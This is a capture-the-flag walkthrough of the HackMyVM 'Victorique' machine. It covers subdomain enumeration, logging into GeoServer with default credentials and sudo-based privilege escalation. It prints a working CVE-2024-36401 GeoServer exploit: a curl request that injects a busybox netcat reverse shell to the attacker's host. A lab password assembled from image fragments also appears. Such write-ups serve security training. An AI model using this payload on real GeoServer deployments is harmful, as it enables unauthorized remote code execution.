# Victorique

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| Victorique | sunset | Beginner | HackMyVM |

**Summary:** Victorique is a GOSICK-themed Linux machine that requires domain-based enumeration to discover multiple virtual hosts. The shell access is achieved through CVE-2024-36401 in GeoServer 2.25.1, which allows remote code execution. Privilege escalation involves using a sudo-enabled img2txt.py script to extract password fragments hidden in various image files scattered across the filesystem, which when combined in the correct order provide the root password.

---

## Reconnaissance

### Network Discovery

The initial network scan identified the target machine:

```powershell
[+] Virtual Targets Found:
------------------------------------------------------------

IP             MAC               Vendor
--             ---               ------
192.168.100.42 08:00:27:4E:AE:68 VirtualBox
```

### Port Scanning

A comprehensive nmap scan revealed two open services:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ nmap -sCV -p- 192.168.100.42
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-28 15:53 WIB
Nmap scan report for 192.168.100.42
Host is up (0.0017s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey:
|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.62 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.69 seconds
```

### Web Service Investigation

Initial access to the HTTP service on port 80 resulted in an access denied message, requiring domain access:

![](image.png)

### Domain Configuration

The `/etc/hosts` file was updated to include the domain mapping:

```bash
┌──(root㉿CLIENT-DESKTOP)-[~]
└─# echo "192.168.100.42 victorique.xyz" | sudo tee -a /etc/hosts
192.168.100.42 victorique.xyz

┌──(root㉿CLIENT-DESKTOP)-[~]
└─# cat /etc/hosts | grep victorique.xyz
192.168.100.42  victorique.xyz

┌──(root㉿CLIENT-DESKTOP)-[~]
└─# curl -I http://victorique.xyz/
HTTP/1.1 200 OK
Date: Wed, 28 Jan 2026 09:04:31 GMT
Server: Apache/2.4.62 (Debian)
Last-Modified: Fri, 12 Dec 2025 05:58:54 GMT
ETag: "2086-645baf4da0ef4"
Accept-Ranges: bytes
Content-Length: 8326
Vary: Accept-Encoding
Content-Type: text/html
```

### Main Website Analysis

Accessing `victorique.xyz` revealed a GOSICK-themed website:

![](image-1.png)

### Directory Enumeration

Initial directory enumeration revealed several endpoints but no useful information was found in source code examination:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ feroxbuster -u http://victorique.xyz/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -x php,txt,bak -t 30

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://victorique.xyz/
 🚩  In-Scope Url          │ victorique.xyz
 🚀  Threads               │ 30
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php, txt, bak]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      276c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      279c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      306l      820w    10959c http://victorique.xyz/login
200      GET     1914l    11013w   828758c http://victorique.xyz/image/vtr.png
200      GET      151l      472w     7209c http://victorique.xyz/profile
200      GET      102l      396w     4980c http://victorique.xyz/library
200      GET      196l      628w     8326c http://victorique.xyz/
301      GET        9l       28w      316c http://victorique.xyz/image => http://victorique.xyz/image/
200      GET      196l      628w     8326c http://victorique.xyz/index
[####################] - 11s    19040/19040   0s      found:7       errors:0
[####################] - 10s    19004/19004   1874/s  http://victorique.xyz/
[####################] - 1s     19004/19004   30213/s http://victorique.xyz/image/ => Directory listing (add --scan-dir-listings to scan) 
```

Results from the enumeration and source code examination found no useful information. 

### Subdomain Discovery

Due to the domain-based access requirement, subdomain enumeration was performed. The initial scan returned false positives due to wildcard DNS:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ ffuf -u http://victorique.xyz -H "Host: FUZZ.victorique.xyz" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 8326

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://victorique.xyz
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.victorique.xyz
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 8326
________________________________________________

forum                   [Status: 200, Size: 89, Words: 12, Lines: 2, Duration: 16ms]
mail                    [Status: 200, Size: 89, Words: 12, Lines: 2, Duration: 16ms]
blog                    [Status: 200, Size: 89, Words: 12, Lines: 2, Duration: 19ms]
mobile                  [Status: 200, Size: 89, Words: 12, Lines: 2, Duration: 19ms]
autodiscover            [Status: 200, Size: 89, Words: 12, Lines: 2, Duration: 20ms]
whm                     [Status: 200, Size: 89, Words: 12, Lines: 2, Duration: 23ms]
localhost               [Status: 200, Size: 89, Words: 12, Lines: 2, Duration: 24ms]
...
```

These appeared to be false positives - either the server has catch-all/wildcard DNS because all responses were 200 OK. Additional filtering was applied with -fs 89:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ ffuf -u http://victorique.xyz -H "Host: FUZZ.victorique.xyz" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 8326,89

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://victorique.xyz
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.victorique.xyz
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 8326,89
________________________________________________

gifts                   [Status: 200, Size: 8367, Words: 2299, Lines: 200, Duration: 19ms]
:: Progress: [4989/4989] :: Job [1/1] :: 164 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
```

One subdomain was discovered: `gifts`

---

## Initial Access

### Gifts Subdomain Configuration

The gifts subdomain was added to the hosts file:

```bash
┌──(root㉿CLIENT-DESKTOP)-[~]
└─# sed -i '/192.168.100.42 victorique.xyz/s/$/ gifts.victorique.xyz/' /etc/hosts

┌──(root㉿CLIENT-DESKTOP)-[~]
└─# cat /etc/hosts | grep 192.168.100.42
192.168.100.42 victorique.xyz  gifts.victorique.xyz

┌──(root㉿CLIENT-DESKTOP)-[~]
└─# curl -I http://gifts.victorique.xyz
HTTP/1.1 200 OK
Date: Wed, 28 Jan 2026 09:26:37 GMT
Server: Apache/2.4.62 (Debian)
Last-Modified: Fri, 12 Dec 2025 06:44:09 GMT
ETag: "20af-645bb96b12d8a"
Accept-Ranges: bytes
Content-Length: 8367
Vary: Accept-Encoding
Content-Type: text/html
```

### Gifts Subdomain Analysis

Accessing gifts.victorique.xyz:

![](image-2.png)

This provided credentials but login attempts were unsuccessful:

![](image-3.png)

Checking if there were subdomains within gifts.victorique.xyz yielded no results.

### Directory/File Enumeration

A targeted search was performed to find gift-related directories:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ grep -hEri "gift|present|promo|redeem|voucher|coupon|claim|award" /usr/share/wordlists/seclists/Discovery/Web-Content/ | grep -oE "[a-zA-Z0-9-]{3,}" | sort -u > gift_words.txt

┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ head -n 5 gift_words.txt
0-0
00020361giftguidebutton
000vafashiononlypresentla3
009
00inkjets-coupons

┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ feroxbuster -u http://gifts.victorique.xyz/ -w gift_words.txt -x txt,html,php -t 30

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://gifts.victorique.xyz/
 🚩  In-Scope Url          │ gifts.victorique.xyz
 🚀  Threads               │ 30
 📖  Wordlist              │ gift_words.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [txt, html, php]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      285c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      282c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      199l      650w     8367c http://gifts.victorique.xyz/
200      GET       57l      935w     9785c http://gifts.victorique.xyz/greatgifts.txt
200      GET      199l      650w     8367c http://gifts.victorique.xyz/index.html
[####################] - 35s    73016/73016   0s      found:3       errors:2
[####################] - 35s    73012/73012   2092/s  http://gifts.victorique.xyz/ 
```

The critical file `greatgifts.txt` was discovered.

### Critical File Discovery

Accessing: http://gifts.victorique.xyz/greatgifts.txt

![](image-4.png)

The content revealed: `Ka4zuyaKujo0`

Checking if this was a directory or file:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ curl -I http://gifts.victorique.xyz/Ka4zuyaKujo0/
HTTP/1.1 404 Not Found
Date: Wed, 28 Jan 2026 09:51:15 GMT
Server: Apache/2.4.62 (Debian)
Content-Type: text/html; charset=iso-8859-1
```

This was possibly a new subdomain again.

### Third-Level Subdomain Discovery

```bash
┌──(root㉿CLIENT-DESKTOP)-[~]
└─# sed -i '/192.168.100.42/s/$/ Ka4zuyaKujo0.victorique.xyz/' /etc/hosts

┌──(root㉿CLIENT-DESKTOP)-[~]
└─# cat /etc/hosts | grep 192.168.100.42
192.168.100.42 victorique.xyz  gifts.victorique.xyz Ka4zuyaKujo0.victorique.xyz

┌──(root㉿CLIENT-DESKTOP)-[~]
└─# curl -I http://Ka4zuyaKujo0.victorique.xyz
HTTP/1.1 404 Not Found
Date: Wed, 28 Jan 2026 09:55:39 GMT
Server: Jetty(9.4.52.v20230823)
Cache-Control: must-revalidate,no-cache,no-store
Content-Type: text/html;charset=iso-8859-1
Content-Length: 444
```

Jetty server? The site required browser access to: http://Ka4zuyaKujo0.victorique.xyz

![](image-5.png)

Clicking geoserver brought us to:

![](image-6.png)

Default username and password for GeoServer found on Google was `admin:geoserver`:

![](image-7.png)

Successfully logged in. The version was discovered:

![](image-8.png)

Version: 2.25.1

Research revealed this version is related to CVE-2024-36401.

https://github.com/vulhub/vulhub/tree/master/geoserver/CVE-2024-36401 - This PoC information was very helpful for the exploit.

### Reverse Shell Exploitation

Setting up listener:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
```

Payload:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ curl -X POST http://ka4zuyakujo0.victorique.xyz/geoserver/wfs -H "Content-Type: application/xml" -d '<wfs:GetPropertyValue service="WFS" version="2.0.0" xmlns:topp="http://www.openplans.org/topp" xmlns:fes="http://www.opengis.net/fes/2.0" xmlns:wfs="http://www.opengis.net/wfs/2.0"><wfs:Query typeNames="sf:archsites"/><wfs:valueReference>exec(java.lang.Runtime.getRuntime(),"sh -c $@|sh . echo busybox nc 192.168.100.1 4444 -e /bin/sh")</wfs:valueReference></wfs:GetPropertyValue>'
<?xml version="1.0" encoding="UTF-8"?><ows:ExceptionReport xmlns:xs="http://www.w3.org/2001/XMLSchema" xmlns:ows="http://www.opengis.net/ows/1.1" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" version="2.0.0" xsi:schemaLocation="http://www.opengis.net/ows/1.1 http://ka4zuyakujo0.victorique.xyz/geoserver/schemas/ows/1.1.0/owsAll.xsd">
  <ows:Exception exceptionCode="NoApplicableCode">
    <ows:ExceptionText>java.lang.ClassCastException: class java.lang.ProcessImpl cannot be cast to class org.geotools.api.feature.type.AttributeDescriptor (java.lang.ProcessImpl is in module java.base of loader &apos;bootstrap&apos;; org.geotools.api.feature.type.AttributeDescriptor is in unnamed module of loader org.eclipse.jetty.webapp.WebAppClassLoader @461ad730)
class java.lang.ProcessImpl cannot be cast to class org.geotools.api.feature.type.AttributeDescriptor (java.lang.ProcessImpl is in module java.base of loader &apos;bootstrap&apos;; org.geotools.api.feature.type.AttributeDescriptor is in unnamed module of loader org.eclipse.jetty.webapp.WebAppClassLoader @461ad730)</ows:ExceptionText>
  </ows:Exception>
</ows:ExceptionReport>
```

Successfully connected and upgraded PTY:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [172.21.44.133] from (UNKNOWN) [172.21.32.1] 62193
id
uid=1001(victorique) gid=1001(victorique) groups=1001(victorique)
python3 -c 'import pty; pty.spawn("/bin/bash")'
victorique@Victorique:~/Geo$ ^Z
zsh: suspended  nc -lvnp 4444

┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ stty raw -echo; fg
[1]  + continued  nc -lvnp 4444

victorique@Victorique:~/Geo$ export TERM=xterm-256color
victorique@Victorique:~/Geo$ cd
victorique@Victorique:~$ ls -la
total 140
drwxr-xr-x  4 victorique victorique   4096 Jan 28 07:13 .
drwxr-xr-x  3 root       root         4096 Dec 12 04:55 ..
lrwxrwxrwx  1 root       root            9 Dec 12 02:36 .bash_history -> /dev/null
-rw-r--r--  1 victorique victorique    220 Apr 18  2019 .bash_logout
-rw-r--r--  1 victorique victorique   3526 Apr 18  2019 .bashrc
drwxr-xr-x 12 victorique victorique   4096 Jan 28 07:13 Geo
-rw-r--r--  1 root       root          149 Dec 12 21:35 hint.txt
-rwx------  1 root       root       105918 Dec 12 04:08 .kagura.png
drwxr-xr-x  2 victorique victorique   4096 Dec 12 21:36 .oracle_jre_usage
-rw-r--r--  1 victorique victorique    807 Apr 18  2019 .profile
-rw-r--r--  1 root       root           33 Dec 12 02:40 user.txt
victorique@Victorique:~$ cat hint.txt
Found some useful fragments. Converted them into a visual representation.

                                                         --Cordelia Gallo
```

---

## Privilege Escalation

### Finding Credentials for Victorique

```bash
victorique@Victorique:/var/www/html$ grep -r "victorique" . 2>/dev/null
./login.php:    // 用户 victorique 的密码,User victorique's Password: shi[REDACTED]
./index.html:                GOSICK - victorique
```

### PrivEsc Analysis

```bash
victorique@Victorique:/var/www/html$ sudo -l
Matching Defaults entries for victorique on Victorique:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User victorique may run the following commands on Victorique:
    (ALL) /usr/bin/python3 /opt/img2txt.py *

victorique@Victorique:~$ find / -type f -perm 700 2>/dev/null
/gallo.webp
/usr/games/.haru.ppm
/home/victorique/.kagura.png
/opt/.kujo.png
/etc/ssh/.shinigami.png
/var/www/html/IoIooIIOIOio/sunset.webp
/var/www/html/.victorique.png
/var/mail/.ciallo.ppm
```

Successfully found 3 words through image extraction:

```bash
victorique@Victorique:~$ sudo python3 /opt/img2txt.py --input /etc/ssh/.shinigami.png --output d.txt --mode simple
victorique@Victorique:~$ cat d.txt
```

![](image-10.png)

```bash
victorique@Victorique:~$ sudo python3 /opt/img2txt.py --input /var/www/html/IoIooIIOIOio/sunset.webp --output e.txt --mode simple
victorique@Victorique:~$ cat e.txt
```

![](image-11.png)

```bash
victorique@Victorique:~$ sudo python3 /opt/img2txt.py --input /usr/games/.haru.ppm --output h.txt --mode simple
victorique@Victorique:~$ cat h.txt
```

![](image-12.png)

```bash
victorique@Victorique:~$ python3 -c 'import itertools as it; w=["C11pp3r5", "10n5h1p", "ch4mp"]; [print("".join(p)) for p in it.permutations(w)]'
C11pp3r510n5h1pch4mp
C11pp3r5ch4mp10n5h1p
10n5h1pC11pp3r5ch4mp
10n5h1pch4mpC11pp3r5
ch4mpC11pp3r510n5h1p
ch4mp10n5h1pC11pp3r5
```

Login as root:
```bash
victorique@Victorique:~$ su - root
Password: 
root@Victorique:~# id
uid=0(root) gid=0(root) groups=0(root)
root@Victorique:~# ls -la
total 68
drwx------  7 root root  4096 Dec 12 23:03 .
drwxr-xr-x 18 root root  4096 Dec 12 21:15 ..
lrwxrwxrwx  1 root root     9 Mar 18  2025 .bash_history -> /dev/null
-rw-r--r--  1 root root   570 Jan 31  2010 .bashrc
drwxr-xr-x  4 root root  4096 Apr  4  2025 .cache
drwx------  3 root root  4096 Apr  4  2025 .gnupg
drwxr-xr-x  3 root root  4096 Mar 18  2025 .local
drwxr-xr-x  2 root root  4096 Dec 11 21:34 .oracle_jre_usage
-rw-r--r--  1 root root   148 Aug 17  2015 .profile
-rwx------  1 root root 14941 Dec 12 20:53 root.png
drw-------  2 root root  4096 Apr  4  2025 .ssh
-rw-------  1 root root 12435 Dec 12 21:35 .viminfo
root@Victorique:~# cat /home/victorique/user.txt
flag{user-G[REDACTED]}
root@Victorique:~# python3 /opt/img2txt.py --input root.png --output root.txt --mode simple --num_cols 1000
root@Victorique:~# cat root.txt
```

Had to zoom out to see the results:

![](image-13.png)

---

## Attack Chain Summary

1. **Reconnaissance**: Nmap scan identified SSH (22) and HTTP (80) services, with HTTP requiring domain-based access to `victorique.xyz`
2. **Vulnerability Discovery**: Discovered main domain through access denied error, followed by subdomain enumeration revealing `gifts.victorique.xyz`
3. **Exploitation**: Found credentials and hints on gifts subdomain, leading to discovery of `greatgifts.txt` containing `Ka4zuyaKujo0`
4. **Internal Enumeration**: Identified `Ka4zuyaKujo0.victorique.xyz` running GeoServer 2.25.1 on Jetty server
5. **Authentication Bypass**: Successfully accessed GeoServer administration panel using default credentials `admin:geoserver`
6. **Remote Code Execution**: Exploited CVE-2024-36401 in GeoServer 2.25.1 through malicious XML payload to achieve reverse shell as user `victorique`
7. **Privilege Analysis**: Discovered sudo permission allowing execution of `/opt/img2txt.py` with wildcard arguments as root
8. **Hidden Content Discovery**: Located multiple hidden image files across filesystem using permission-based search
9. **Password Fragment Recovery**: Used img2txt.py to extract password fragments (`C11pp3r5`, `10n5h1p`, `ch4mp`) from hidden images
10. **Password Reconstruction**: Combined fragments in correct order to form root password.
11. **Privilege Escalation**: Successfully escalated to root privileges and extracted flags from both user.txt and root.png using the img2txt.py utility